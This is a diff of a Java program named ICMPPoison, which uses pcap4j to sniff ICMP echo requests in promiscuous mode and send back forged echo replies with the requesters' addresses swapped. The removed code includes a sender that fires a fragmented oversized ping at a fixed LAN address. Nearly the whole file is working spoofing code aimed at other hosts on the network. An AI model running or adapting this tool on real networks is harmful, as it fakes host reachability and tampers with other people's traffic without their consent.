@@ -1,3 +1,4 @@
+import jnr.ffi.annotations.In;
 import org.pcap4j.core.*;
 import org.pcap4j.packet.*;
 import org.pcap4j.packet.namednumber.*;
@@ -15,14 +16,10 @@ import java.util.concurrent.TimeoutException;
 public class ICMPPoison {
 
     public static void main(String[] args) {
-
-
-//        try{
-//            test();
-//        } catch(Exception e){
-//            System.exit(2);
-//        }
-
+        int packetsToCapture = 1;
+        if(args.length > 0){
+            packetsToCapture = Integer.parseInt(args[0]);
+        }
         PcapNetworkInterface networkInterface;
         try {
             networkInterface = MacAddressResolver.getAvailableNetworkInterface();
@@ -30,135 +27,15 @@ public class ICMPPoison {
             throw new RuntimeException(e);
         }
 
-        posionICMP(networkInterface);
+        posionICMP(networkInterface, packetsToCapture);
 
-        System.exit(2);
-
-        PcapHandle handle;
-        try {
-            handle = networkInterface.openLive(65536, PcapNetworkInterface.PromiscuousMode.PROMISCUOUS, 10);
-        } catch (PcapNativeException e) {
-            throw new RuntimeException(e);
-        }
-
-        byte[] payload = new byte[]{(byte) 0x01, (byte) 0x02, (byte) 0x03, (byte) 0x04};
-        IcmpV4EchoReplyPacket.Builder icmpBuilder = new IcmpV4EchoReplyPacket.Builder();
-        icmpBuilder
-                .identifier((short) 12345)
-                .sequenceNumber((short) 1)
-                .payloadBuilder(new UnknownPacket.Builder().rawData(payload)).build();
-
-        Packet icmpPacket = icmpBuilder.build();
-        //System.out.println(icmpPacket);
-
-
-        String strSrcIpAddress = "192.168.0.171";
-        String strDstIpAddress = "192.168.0.118";
-
-        MacAddress strDstMacAddress = null;
-        try {
-            strDstMacAddress = MacAddressResolver.resolveMacAddress(InetAddress.getByName(strDstIpAddress));
-        } catch (UnknownHostException e) {
-            throw new RuntimeException(e);
-        }
-
-        byte[] echoData = new byte[4000 - 28];
-        for (int i = 0; i < echoData.length; i++) {
-            echoData[i] = (byte) i;
-        }
-
-        IcmpV4EchoPacket.Builder echoBuilder = new IcmpV4EchoPacket.Builder();
-        echoBuilder
-                .identifier((short) 1)
-                .payloadBuilder(new UnknownPacket.Builder().rawData(echoData));
-
-        IcmpV4CommonPacket.Builder icmpV4CommonBuilder = new IcmpV4CommonPacket.Builder();
-        icmpV4CommonBuilder
-                .type(IcmpV4Type.ECHO)
-                .code(IcmpV4Code.NO_CODE)
-                .payloadBuilder(echoBuilder)
-                .correctChecksumAtBuild(true);
-
-        IpV4Packet.Builder ipV4Builder = new IpV4Packet.Builder();
-        try {
-            ipV4Builder
-                    .version(IpVersion.IPV4)
-                    .tos(IpV4Rfc791Tos.newInstance((byte) 0))
-                    .ttl((byte) 100)
-                    .protocol(IpNumber.ICMPV4)
-                    .srcAddr((Inet4Address) InetAddress.getByName(strSrcIpAddress))
-                    .dstAddr((Inet4Address) InetAddress.getByName(strDstIpAddress))
-                    .payloadBuilder(icmpV4CommonBuilder)
-                    .correctChecksumAtBuild(true)
-                    .correctLengthAtBuild(true);
-        } catch (UnknownHostException e1) {
-            throw new IllegalArgumentException(e1);
-        }
-
-        EthernetPacket.Builder etherBuilder = new EthernetPacket.Builder();
-        MacAddress srcMacAddr = MacAddress.getByAddress(networkInterface.getLinkLayerAddresses().getFirst().getAddress());
-        etherBuilder
-                .dstAddr(strDstMacAddress)
-                .srcAddr(srcMacAddr)
-                .type(EtherType.IPV4)
-                .paddingAtBuild(true);
-
-        for (int i = 0; i < 1; i++) {
-            echoBuilder.sequenceNumber((short) i);
-            ipV4Builder.identification((short) i);
-
-            for (final Packet ipV4Packet : IpV4Helper.fragment(ipV4Builder.build(), 1403)) {
-                etherBuilder.payloadBuilder(
-                        new AbstractPacket.AbstractBuilder() {
-                            @Override
-                            public Packet build() {
-                                return ipV4Packet;
-                            }
-                        });
-
-                Packet p = etherBuilder.build();
-
-                System.out.println(p);
-                try {
-                    handle.sendPacket(p);
-                } catch (PcapNativeException ex) {
-                    throw new RuntimeException(ex);
-                } catch (NotOpenException ex) {
-                    throw new RuntimeException(ex);
-                }
-
-                try {
-                    Thread.sleep(100);
-                } catch (InterruptedException e) {
-                    break;
-                }
-            }
-
-            try {
-                Thread.sleep(1000);
-            } catch (InterruptedException e) {
-                break;
-            }
-        }
-
-        if (handle != null && handle.isOpen()) {
-            try {
-                handle.breakLoop();
-            } catch (NotOpenException noe) {
-            }
-            try {
-                Thread.sleep(1000);
-            } catch (InterruptedException e) {
-            }
-            handle.close();
-        }
     }
 
-    public static void posionICMP(PcapNetworkInterface networkInterface){
+    public static void posionICMP(PcapNetworkInterface networkInterface, int packetsToCapture) {
 
         int capturedICMPPackets = 0;
 
-        if (networkInterface == null){
+        if (networkInterface == null) {
             return;
         }
 
@@ -177,19 +54,38 @@ public class ICMPPoison {
             throw new RuntimeException(e);
         }
 
-        while(capturedICMPPackets < 10){
+        while (capturedICMPPackets < packetsToCapture) {
 
             try {
                 Packet packet = null;
                 packet = handle.getNextPacketEx();
 
-                if(packet.contains(IcmpV4EchoPacket.class)){
+                if (packet.contains(IcmpV4EchoPacket.class)) {
                     IcmpV4EchoPacket icmpV4EchoPacket = packet.get(IcmpV4EchoPacket.class);
 
-                    System.out.println(icmpV4EchoPacket);
+                    //EthernetPacket ethernetPacket = packet.get(EthernetPacket.class);
 
+                    //System.out.println(ethernetPacket);
+
+                    //System.out.println(icmpV4EchoPacket);
+
+                    //IpV4Packet ipv4 = packet.get(IpV4Packet.class);
+                    //System.out.println(ipv4);
+
+
+                    Packet fakeReply = buildFakeICMPReply(packet);
+
+                    handle.sendPacket(fakeReply);
 
                     capturedICMPPackets++;
+
+
+                }
+
+                if (packet.contains(IcmpV4EchoReplyPacket.class)) {
+
+                    EthernetPacket ethernetPacket = packet.get(EthernetPacket.class);
+                    System.out.println(ethernetPacket);
                 }
 
 
@@ -205,112 +101,120 @@ public class ICMPPoison {
         }
     }
 
-    private static void test() throws Exception {
-        // Pick interface: either pass interface name as first arg or use first available
+    private static Packet buildFakeICMPReply(Packet icmpEchoPacket) {
 
-        PcapNetworkInterface nif = null;
-        try {
-            nif = MacAddressResolver.getAvailableNetworkInterface();
-        } catch (PcapNativeException e) {
-            throw new RuntimeException(e);
-        }
+        EthernetPacket ethernetHeader = icmpEchoPacket.get(EthernetPacket.class);
+        IpV4Packet ipV4Packet = icmpEchoPacket.get(IpV4Packet.class);
+        IcmpV4EchoPacket icmpV4EchoPacket = icmpEchoPacket.get(IcmpV4EchoPacket.class);
 
-        System.out.println("Using interface: " + nif.getName() + " (" + nif.getDescription() + ")");
+        Inet4Address sourceIP = ipV4Packet.getHeader().getSrcAddr();
+        Inet4Address destinationIP = ipV4Packet.getHeader().getDstAddr();
 
-        // Open handle: 10 ms timeout (used by getNextPacketEx to trigger TimeoutException)
-        PcapHandle handle = nif.openLive(65536, PcapNetworkInterface.PromiscuousMode.PROMISCUOUS, 10);
+        MacAddress sourceMac = ethernetHeader.getHeader().getSrcAddr();
+        MacAddress destinationMac = ethernetHeader.getHeader().getDstAddr();
 
-        // Set a BPF filter for ICMP only
-        handle.setFilter("icmp", BpfProgram.BpfCompileMode.OPTIMIZE);
+        int identifier = icmpV4EchoPacket.getHeader().getIdentifier();
+        int sequence = icmpV4EchoPacket.getHeader().getSequenceNumber();
+        byte[] data = icmpV4EchoPacket.getPayload().getRawData();
 
-        int capturedICMPPackets = 0;
-        int target = 10;
-
-        try {
-            while (capturedICMPPackets < target) {
-                try {
-                    // Blocks until a packet arrives or the handle timeout is reached
-                    Packet packet = handle.getNextPacketEx(); // will NOT return null
-
-                    // Check for an ICMPv4 Echo (ping) inside the packet
-                    if (packet.contains(IcmpV4EchoPacket.class)) {
-                        IcmpV4EchoPacket icmpEcho = packet.get(IcmpV4EchoPacket.class);
-                        System.out.println("Captured ICMPv4 Echo packet: " + icmpEcho);
-                        capturedICMPPackets++;
-                    } else {
-                        // If you want to inspect other ICMP types:
-                        // if (packet.contains(IcmpV4CommonPacket.class)) { ... }
-                    }
-
-                } catch (TimeoutException te) {
-                    // No packet within the handle timeout; continue listening
-                } catch (NotOpenException | PcapNativeException e) {
-                    // Underlying error — print and break (or handle differently)
-                    e.printStackTrace();
-                    break;
-                }
-            }
-        } finally {
-            handle.close();
-            System.out.println("Handle closed, captured " + capturedICMPPackets + " packets.");
-        }
+        return buildICMPReplyPacket(IcmpV4Type.ECHO_REPLY, destinationIP, sourceIP, destinationMac, sourceMac, identifier, sequence, data, 2);
     }
 
-    private static class icmpEchoListen implements Callable<MacAddress> {
+    private static Packet buildICMPEchoPacket(IcmpV4Type icmpV4Type, Inet4Address sourceIP, Inet4Address destinationIP, MacAddress sourceMAC, MacAddress destinationMAC, int identifier, int sequence, byte[] data, int ttl) {
 
-        private final PcapHandle handle;
-        private final InetAddress targetIPAddress;
+        UnknownPacket.Builder dataBuilder = new UnknownPacket.Builder();
+        dataBuilder
+                .rawData(data);
 
-        private icmpEchoListen(PcapHandle handle, InetAddress targetIPAddress) {
-            this.handle = handle;
-            this.targetIPAddress = targetIPAddress;
-        }
+        IcmpV4EchoPacket.Builder icmpEchoBuilder = new IcmpV4EchoPacket.Builder();
+        icmpEchoBuilder
+                .identifier((short) identifier)
+                .sequenceNumber((short) sequence)
+                .payloadBuilder(dataBuilder);
 
-        @Override
-        public MacAddress call() throws Exception {
-            while (!Thread.currentThread().isInterrupted()) {
-                Packet packet = handle.getNextPacket();
-                if(packet == null){
-                    continue;
-                }
+        IcmpV4CommonPacket.Builder icmpPacketBuilder = new IcmpV4CommonPacket.Builder();
+        icmpPacketBuilder
+                .type(icmpV4Type)
+                .code(IcmpV4Code.NO_CODE)
+                .payloadBuilder(icmpEchoBuilder)
+                .correctChecksumAtBuild(true);
 
-                ArpPacket arpPacket = packet.get(ArpPacket.class);
-                if(arpPacket != null && arpPacket.getHeader().getOperation().equals(ArpOperation.REPLY)){
-                    ArpPacket.ArpHeader arpHeader = arpPacket.getHeader();
-                    if(targetIPAddress.equals(arpHeader.getSrcProtocolAddr())) {
-                        return arpHeader.getSrcHardwareAddr();
-                    }
-                }
+        IpV4Packet.Builder ipPacketBuilder = new IpV4Packet.Builder();
+        IpV4Packet.IpV4Tos ipV4Tos = new IpV4Packet.IpV4Tos() {
+            @Override
+            public byte value() {
+                return 0;
             }
-            return null;
-        }
+        };
+        ipPacketBuilder
+                .version(IpVersion.IPV4)
+                .tos(ipV4Tos)
+                .identification((short) 0)
+                .ttl((byte) ttl)
+                .protocol(IpNumber.ICMPV4)
+                .srcAddr(sourceIP)
+                .dstAddr(destinationIP)
+                .payloadBuilder(icmpPacketBuilder)
+                .correctChecksumAtBuild(true)
+                .correctLengthAtBuild(true);
+
+        EthernetPacket.Builder ethernetPacketBuilder = new EthernetPacket.Builder();
+        ethernetPacketBuilder
+                .srcAddr(sourceMAC)
+                .dstAddr(destinationMAC)
+                .type(EtherType.IPV4)
+                .payloadBuilder(ipPacketBuilder)
+                .paddingAtBuild(true);
+
+        return ethernetPacketBuilder.build();
+    }
+
+    private static Packet buildICMPReplyPacket(IcmpV4Type icmpV4Type, Inet4Address sourceIP, Inet4Address destinationIP, MacAddress sourceMAC, MacAddress destinationMAC, int identifier, int sequence, byte[] data, int ttl) {
+
+        UnknownPacket.Builder dataBuilder = new UnknownPacket.Builder();
+        dataBuilder
+                .rawData(data);
+
+        IcmpV4EchoReplyPacket.Builder icmpEchoReplyBuilder = new IcmpV4EchoReplyPacket.Builder();
+        icmpEchoReplyBuilder
+                .identifier((short) identifier)
+                .sequenceNumber((short) sequence)
+                .payloadBuilder(dataBuilder);
+
+        IcmpV4CommonPacket.Builder icmpPacketBuilder = new IcmpV4CommonPacket.Builder();
+        icmpPacketBuilder
+                .type(icmpV4Type)
+                .code(IcmpV4Code.NO_CODE)
+                .payloadBuilder(icmpEchoReplyBuilder)
+                .correctChecksumAtBuild(true);
+
+        IpV4Packet.Builder ipPacketBuilder = new IpV4Packet.Builder();
+        IpV4Packet.IpV4Tos ipV4Tos = new IpV4Packet.IpV4Tos() {
+            @Override
+            public byte value() {
+                return 0;
+            }
+        };
+        ipPacketBuilder
+                .version(IpVersion.IPV4)
+                .tos(ipV4Tos)
+                .identification((short) 0)
+                .ttl((byte) ttl)
+                .protocol(IpNumber.ICMPV4)
+                .srcAddr(sourceIP)
+                .dstAddr(destinationIP)
+                .payloadBuilder(icmpPacketBuilder)
+                .correctChecksumAtBuild(true)
+                .correctLengthAtBuild(true);
+
+        EthernetPacket.Builder ethernetPacketBuilder = new EthernetPacket.Builder();
+        ethernetPacketBuilder
+                .srcAddr(sourceMAC)
+                .dstAddr(destinationMAC)
+                .type(EtherType.IPV4)
+                .payloadBuilder(ipPacketBuilder)
+                .paddingAtBuild(true);
+
+        return ethernetPacketBuilder.build();
     }
 }
-
-
-
-
-
-//PacketListener listener = packet -> {
-//            if (packet.contains(IcmpV4EchoPacket.class)) {
-//
-//                IcmpV4EchoPacket icmpV4EchoPacket = packet.get(IcmpV4EchoPacket.class);
-//                IcmpV4EchoPacket.IcmpV4EchoHeader icmpV4EchoHeader = icmpV4EchoPacket.getHeader();
-//
-//                icmpV4EchoHeader.getSequenceNumber();
-//
-//                IcmpV4EchoReplyPacket.Builder icmpReplyBuilder = new IcmpV4EchoReplyPacket.Builder();
-////
-////                byte[] payload = new byte[] { (byte) 0x01, (byte) 0x02, (byte) 0x03, (byte) 0x04 };
-////                IcmpV4EchoReplyPacket.Builder icmpBuilder = new IcmpV4EchoReplyPacket.Builder();
-////                icmpBuilder
-////                        .identifier((short) 12345)
-////                        .sequenceNumber((short) 1)
-////                        .payloadBuilder(new UnknownPacket.Builder().rawData(payload)).build();
-////
-////                Packet icmpPacket = icmpBuilder.build();
-////                System.out.println(icmpPacket);
-//            }
-//        };
-//    }
-//}
